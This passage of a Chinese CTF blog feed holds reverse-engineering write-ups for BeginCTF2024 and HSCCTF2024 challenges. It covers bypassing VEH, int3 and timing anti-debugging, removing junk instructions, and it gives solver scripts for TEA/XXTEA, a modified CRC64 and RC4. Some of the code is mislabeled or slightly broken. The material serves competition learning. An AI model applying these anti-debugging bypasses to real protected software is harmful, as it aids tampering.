class="hljs-comment">#begin&#123;Y@u_aRe_g00d_aT_play1ng_witH_sNake3&#125;</span><br></code></pre></td></tr></table></figure><h2 id="not-main-1"><a href="#not-main-1" class="headerlink" title="not_main-1"></a>not_main-1</h2><p>main函数有个tea</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707979757333-dd70d300-8f41-4934-97c5-921e8ef1f5e4.png" class="" title="img"><p>有veh反调试</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707983479051-7c947081-579d-4590-bb07-b86fc9e0967c.png" class="" title="img"><p>本题通过实现一个全局类让程序在main函数之前就执行类的构造函数，在main函数结束后执行类的析构函数</p><p>构造函数中veh定义了int 3断点和除0异常的处理方法</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707983700530-4022be77-f4f3-4fdf-a263-24924734409b.png" class="" title="img"><p>int3断点的处理逻辑是，当前程序在main函数中会执行事先放置的int3，此时如果在未调试的情况下，程序将异常交给veh处理，将一个dword_405038赋值为0. 如果是调试情况下将异常交给调试器处理，如果此时调试器处理异常则不会交给veh，则dword_405038为1.main函数接下来会对输入进行虚假的判断。在判断后进入到析构函数中</p><p>析构函数会根据先前的dword_405038即图中的is_debug变量的值判断是否除零。除零进入到veh handler的除零异常处理块中</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707983982520-4d2801b1-229a-422d-8b24-2c64b30ea358.png" class="" title="img"><p>后面是标准的xxtea</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707984388378-1e345bb4-f09f-4285-83fc-efa6d238560d.png" class="" title="img"><p>在start里找到关键函数</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707984893642-f220056c-1fb1-4d5e-bcf5-f138b4ee0eb9.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707985056980-3934cacd-2209-4dda-a2cd-a82c76d9b4f7.png" class="" title="img"><p>第三个参数可以看到两个疑似密文的地址</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707985106747-98b4b2d8-0f60-4dc3-8e84-33c0f5d41585.png" class="" title="img"><p>unk_485018引用分别在Handler和main，有可能是main里的假密文</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707985207681-f34fa9c4-7d5d-4ca3-952b-2dfe7c43ca5b.png" class="" title="img"><p>第四个则会触发Handler</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707985133208-40cbe056-87dd-4f91-8185-84f1377121ba.png" class="" title="img"><p>Handler内的unk_485018引用则再次进行了这个操作，也就是说等于没异或</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707985328408-88d4bf17-7681-47c2-80ba-82336264feda.png" class="" title="img"><p>所以如果真逻辑在Handler内，unk_485018就是没用的数据，真正的密文就是unk_48503C</p><p>可以以这种方式取数据</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707985438972-3538b599-c7f5-4324-8f09-f2c6300fc9d4.png" class="" title="img"><p>发现调用Handler在main之前</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707985562001-4455721c-e62b-4e6c-b2cb-5509d2010e13.png" class="" title="img"><p>可以看到main当中的明文是从Handler中引用的，可能XXTEA之后又进行了TEA</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707985501920-3c7dc036-300b-498f-83f8-705596327bdf.png" class="" title="img"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _CRT_SECURE_NO_WARNINGS</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 0x9e3779b9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MX (((z&gt;&gt;5^y<span class="hljs-string">&lt;&lt;2)+(y&gt;</span>&gt;3^z&lt;&lt;4))^((sum^y)+(key[(p&amp;3)^e]^z)))</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">btea</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span>* v, <span class="hljs-type">int</span> n, <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> y, z, sum;<br>    <span class="hljs-type">unsigned</span> p, rounds, e;<br>    <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">1</span>)<br>    &#123;<br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<span class="hljs-comment">//这里可以说是预定义值，n=2是rounds=32</span><br>        sum = <span class="hljs-number">0</span>;<br>        z = v[n - <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>            sum += DELTA;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = <span class="hljs-number">0</span>; p &lt; n - <span class="hljs-number">1</span>; p++)      <br>            &#123;<br>                y = v[p + <span class="hljs-number">1</span>];<br>                z = v[p] += MX;<br>            &#125;<br>            y = v[<span class="hljs-number">0</span>];<br>            z = v[n - <span class="hljs-number">1</span>] += MX;       <br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">-1</span>)<br>    &#123;<br>        n = -n;<br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = rounds * DELTA;<br>        y = v[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = n - <span class="hljs-number">1</span>; p &gt; <span class="hljs-number">0</span>; p--)    <br>                z = v[p - <span class="hljs-number">1</span>];<br>                y = v[p] -= MX;<br>            &#125;<br>            z = v[n - <span class="hljs-number">1</span>];<br>            y = v[<span class="hljs-number">0</span>] -= MX;    <br>            sum -= DELTA;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">detea</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span>* v, <span class="hljs-type">uint32_t</span>* k)</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], sum = <span class="hljs-number">0xC6EF3720</span>, i;<br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">0x9e3779b9</span>;<br>    <span class="hljs-type">uint32_t</span> k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        v1 -= ((v0 &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + k3);<br>        v0 -= ((v1 &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + k1);<br>        sum -= delta;<br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0; v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">8</span>] = &#123; <span class="hljs-number">0xCFBE0F1B</span>, <span class="hljs-number">0x05F3083F</span>, <span class="hljs-number">0x4220E43B</span>, <span class="hljs-number">0x3383AFEE</span>, <span class="hljs-number">0xFA3237CE</span>, <span class="hljs-number">0xECADA66E</span>, <span class="hljs-number">0xA8D47CA7</span>, <span class="hljs-number">0xEFC51077</span> &#125;;<br>    <span class="hljs-type">uint32_t</span> k[<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">116</span>,<span class="hljs-number">114</span>,<span class="hljs-number">117</span>,<span class="hljs-number">101</span> &#125;;<span class="hljs-comment">//true</span><br>    <span class="hljs-type">uint32_t</span> fk[<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">0x66</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x6B</span>,<span class="hljs-number">0x65</span> &#125;;<span class="hljs-comment">//fake</span><br>    <span class="hljs-type">int</span> i, n = <span class="hljs-number">8</span>;<br>    btea(v, -n, k);<span class="hljs-comment">//负号是解密</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i += <span class="hljs-number">2</span>)<br>        detea(v + i, fk);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, v);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//begin&#123;not_main_is_matter!&#125;</span><br></code></pre></td></tr></table></figure><h2 id="出题人的密码-1"><a href="#出题人的密码-1" class="headerlink" title="出题人的密码-1"></a>出题人的密码-1</h2><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707121166054-454a20dc-fc79-4173-b3b9-c0ade38d93b4.png" class="" title="img"><p>有花指令，按官方wp的方法去花指令</p><p>call指令按u，下一行按c，再nop call，把90转为数据，再按c变为nop</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710310180745-911708e0-4a7c-441c-8994-c2950867a4c2.png" class="" title="img"><p>密文</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710310207895-f8791692-bf2a-40e0-8245-5eb5676ffff7.png" class="" title="img"><p>搜Buffer的引用就可以快速找到加密函数</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710310683087-94b0f31b-b8bf-48f0-89e6-5bfcdcad3755.png" class="" title="img"><p>直接逆向，但是v2不知道</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710311710013-96128072-d39b-432e-9457-08b664e82f66.png" class="" title="img"><p>直接下断点会有反调试，回到主函数，下断点判断反调试在一开始的地方</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710311890774-ae42d0ee-d594-4b68-bf4c-ddf0632ad3ff.png" class="" title="img"><p>修改zf绕过</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710311816831-261ccade-b998-4c91-b323-6032f9d92f27.png" class="" title="img"><p>发现下面还有一个，再次改zf</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710311983982-1708e580-6d8e-4797-a38a-be068c139ce2.png" class="" title="img"><p>直接得到的key是不对的，因为还有时间反调试</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710312577210-a68f4a5f-7b37-43a7-908e-ab585aa1f299.png" class="" title="img"><p>nop掉然后apply,输入账号的时候记得输入群号612995005</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710315109337-d15b2b90-cd4a-4f5b-a800-02658cda1afd.png" class="" title="img"><p>交叉引用输入的字符串</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710311347958-ca23a5f4-da8c-4f84-ac57-0e883451890f.png" class="" title="img"><p>先+5 ^0x25,然后传给比较的密文</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710311364570-4da8a936-7595-4d84-89e7-884e6507b168.png" class="" title="img"><p>主要加密是一个魔改的crc64，通过和零比较，从而进行不同的加密，实际上是比较最高位</p><p>可以直接逆</p><p>高位溢出到了最低位，所以看密文最低位，根据最低位判断这个数在加密前最高位是1还是0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">key = <span class="hljs-number">0x33077d</span><br><br>def decrypt(value, key):<br>    <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">64</span>):<br>        <span class="hljs-keyword">if</span> value &amp; <span class="hljs-number">1</span>:<br>            value = (value ^ key) &gt;&gt; <span class="hljs-number">1</span><br>            value |= <span class="hljs-number">0x8000000000000000</span>  #还原最高位<br>        <span class="hljs-keyword">else</span>:<br>            value = value &gt;&gt; <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> value<br><br>out = bytes.fromhex(<span class="hljs-string">&#x27;B4BBD8EBD06EABCA658E4BE94DD44AF37D29C2F99589A4859DCDDF77FD45CB5D7DFD934BBCF67CF32442F5D2DDE356AE&#x27;</span>)<br>out = [((i ^ <span class="hljs-number">0x25</span>) - <span class="hljs-number">5</span>) &amp; <span class="hljs-number">0xff</span> <span class="hljs-keyword">for</span> i in out]<br>print(out)<br><br>flag = b<span class="hljs-number">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">0</span>, len(out), <span class="hljs-number">8</span>):<br>    v = <span class="hljs-type">int</span>.from_bytes(out[i: i + <span class="hljs-number">8</span>], <span class="hljs-string">&#x27;little&#x27;</span>)<br>    flag += decrypt(v, key).to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br><br>print(flag.decode())<br></code></pre></td></tr></table></figure><h2 id="goforfun-2"><a href="#goforfun-2" class="headerlink" title="goforfun-2"></a>goforfun-2</h2><p>和big库有关</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710318523731-8f633811-dfcc-413f-989a-f197ff873f01.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710318348426-6ef3ad5c-2474-447a-9de3-46ac29da1373.png" class="" title="img"><p>rc4部分很难辨别，同时key也找不到</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710318429901-180e1f48-0226-4990-8feb-e4d16d39104c.png" class="" title="img"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c">def <span class="hljs-title function_">big_int_to_byte_array</span><span class="hljs-params">(big_int)</span>:<br>    ans=[]<br>    <span class="hljs-keyword">while</span> big_int :<br>        ans.append(big_int&amp;<span class="hljs-number">0xff</span>)<br>        big_int&gt;&gt;=<span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> ans[::<span class="hljs-number">-1</span>]<br><br><br>cmpString = <span class="hljs-string">&quot;HZ0sMJXqxHgUb2b9RNg+1xw&quot;</span><br><br>str1 = <span class="hljs-string">&quot;8G+cazk2jqb7w01CtoKH4FsrgR3vVmQ9pPhXLAleOd/nB6DfIxMWYiUZ5SEJyNuT&quot;</span><br><br>cmpString = <span class="hljs-built_in">list</span>(cmpString)<br><br>str1 = <span class="hljs-built_in">list</span>(str1)<br><br>tmp=[]<br><br><span class="hljs-keyword">for</span> i in cmpString:<br>    tmp.append(str1.index(i))<br><br>print(<span class="hljs-string">&#x27;index:&#x27;</span>)<br>print(tmp)<br><br>bignum = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">for</span> i in range(len(tmp)<span class="hljs-number">-1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">-1</span>):<br>    bignum = bignum*<span class="hljs-number">0x40</span> + tmp[i]<br><br><span class="hljs-meta">#print(<span class="hljs-string">&#x27;bignum:&#x27;</span>)</span><br><span class="hljs-meta">#print((bignum))</span><br><br>bytea = big_int_to_byte_array(bignum)<br><br><span class="hljs-meta">#print(bytea)</span><br><br>def rc4_crypt(key, data):<br>    S = <span class="hljs-built_in">list</span>(range(<span class="hljs-number">255</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">-1</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    # 初始化S盒<br>    <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + ord(key[i % len(key)]) ) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    # 生成密钥流并加解密<br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> <span class="hljs-type">char</span> in data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        out.append(((<span class="hljs-type">char</span>) ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>]^<span class="hljs-number">0x2f</span>))<br><br>    <span class="hljs-keyword">return</span> out<br><br><br>key1=<span class="hljs-string">&#x27;happynewyear&#x27;</span><br><br>key1 = <span class="hljs-built_in">list</span>(key1)<br><br>flag=rc4_crypt(key1,bytea)<br><span class="hljs-keyword">for</span> i in flag:<br>    print(chr(i),end=<span class="hljs-string">&#x27;&#x27;)</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>比赛wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>花指令</tag>
      
      <tag>veh</tag>
      
      <tag>crc64魔改</tag>
      
      <tag>取证</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HSCCTF2024</title>
    <link href="/2024/03/10/HSCCTF2024/"/>
    <url>/2024/03/10/HSCCTF2024/</url>
    
    <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="hello-hscctf"><a href="#hello-hscctf" class="headerlink" title="hello-hscctf"></a>hello-hscctf</h2><p>从图片中提取关键信息</p><img src="/2024/03/10/HSCCTF2024/1709965570558-80b04d90-c33f-4182-a596-1fc0d1c32809.png" class="" title="img"><p>(03338) 76 Friseur Kosmetik Montag，点最后一个</p><img src="/2024/03/10/HSCCTF2024/1709965436900-11ae5ee9-924f-4600-ba89-9405fc614a7d.png" class="" title="img"><p>报纸左下角，搜Friseursalon Aerts</p><img src="/2024/03/10/HSCCTF2024/1709965629705-cf6b6322-fd1e-4e6f-846b-6f8265b578d6.png" class="" title="img"><img src="/2024/03/10/HSCCTF2024/1709965400607-02188237-d602-462f-83ce-16783c0c243f.png" class="" title="img"><img src="/2024/03/10/HSCCTF2024/1709965382282-d5912365-6756-4b76-a271-5435c9507387.png" class="" title="img"><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h2><p>经典tea，密文呈现形式不同</p><img src="/2024/03/10/HSCCTF2024/1709961606736-8a0ceb3b-ea31-492f-8fad-249437667224.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;stdint.h&gt;</span><br><br><span class="hljs-built_in">int</span> main() &#123;<br>uint32_t v[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;;<br>uint32_t delta = <span class="hljs-number">0x61C88647</span>;<br>uint32_t v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], <span class="hljs-built_in">sum</span> = -<span class="hljs-number">32</span> * delta, i; /* <span class="hljs-built_in">set</span> up */<br><br>uint32_t v2[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">0x3D121D26</span>, <span class="hljs-number">0x5E6189F9</span>&#125;, v3[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">0xC1FB278E</span>, <span class="hljs-number">0x3B494648</span>&#125;, v5[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0xb805d767</span>, <span class="hljs-number">0x63c174c3</span>&#125;; //<span class="hljs-number">0x67</span>,<span class="hljs-number">0xd7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0xb8</span><br>unsigned <span class="hljs-built_in">int</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;, l = <span class="hljs-number">0</span>, r = <span class="hljs-number">0</span>;<br>uint32_t k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br>// v为要加密的数据是两个<span class="hljs-number">32</span>位无符号整数<br>// k为加密解密密钥，为<span class="hljs-number">4</span>个<span class="hljs-number">32</span>位无符号整数，即密钥长度为<span class="hljs-number">128</span>位<br><br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> m = <span class="hljs-number">0</span>; m &lt; <span class="hljs-number">2</span>; m += <span class="hljs-number">2</span>) &#123;//flag不全的话有可能是<span class="hljs-number">10</span><br>//<span class="hljs-built_in">sum</span> = -<span class="hljs-number">957401312</span>;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;                     /* basic cycle start */<br>v5[m + <span class="hljs-number">1</span>] -= ((v5[m] &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v5[m] + <span class="hljs-built_in">sum</span>) ^ ((v5[m] &gt;&gt; <span class="hljs-number">5</span>) + k3);<br>v5[m] -= ((v5[m + <span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v5[m + <span class="hljs-number">1</span>] + <span class="hljs-built_in">sum</span>) ^ ((v5[m + <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">5</span>) + k1);<br><span class="hljs-built_in">sum</span> += delta;<br>&#125;                                              /* end cycle */<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>; i++) &#123;<br>printf(<span class="hljs-string">&quot;%x &quot;</span>, v5[i]);<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>; i++) &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>//printf(<span class="hljs-string">&quot;%c&quot;</span>, (v5[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br><br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2024/03/10/HSCCTF2024/1709961543764-2858e782-886c-4814-a0aa-e5deb5787d5a.png" class="" title="img"><p>谁懂啊，exe输入错误，但是直接交是对的</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">688</span>ed036-a86a60ce&#125;<br></code></pre></td></tr></table></figure><h2 id="no-py"><a href="#no-py" class="headerlink" title="no_py"></a>no_py</h2><p>pyc反编译效果不好</p><img src="/2024/03/10/HSCCTF2024/1709966236128-15b77610-7093-4097-be67-f0c51fd89e1d.png" class="" title="img"><p>用在线工具后发现key和enc在其他文件中，感觉和beginCTF的ezpython一模一样</p><img src="/2024/03/10/HSCCTF2024/1709966361759-cd04823d-7b18-46fe-92de-685d0ab82524.png" class="" title="img"><img src="/2024/03/10/HSCCTF2024/1709966965760-a8512425-228e-4aec-a16b-50247053893f.png" class="" title="img"><img src="/2024/03/10/HSCCTF2024/1709967326961-01a13c08-39ea-41d0-a149-0b09f1ba2bbb.png" class="" title="img"><img src="/2024/03/10/HSCCTF2024/1709967524943-3a4e06c9-246e-417a-858c-f7bcaf4e2598.png" class="" title="img"><h2 id="roulette"><a href="#roulette" class="headerlink" title="roulette"></a>roulette</h2><p>基本玩不出的游戏</p><img src="/2024/03/10/HSCCTF2024/1710038562295-31b684f0-b508-4741-9a19-c167db74bd2d.png" class="" title="img"><p>通过算法识别找到blowfish</p><img src="/2024/03/10/HSCCTF2024/1710038776255-a545b936-9122-410b-83f6-e73861058139.png" class="" title="img"><p>7.5的汉化效果好</p><img src="/2024/03/10/HSCCTF2024/1710039007125-ad52680c-29fa-464a-9830-25e876189981.png" class="" title="img"><p>后来按题目的思路走，修改程序一次完成，应该是自解密，不用解程序会帮我解</p><img src="/2024/03/10/HSCCTF2024/1710041102825-dbd65880-e0c1-42f9-aecf-21f84b4f1807.png" class="" title="img"><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 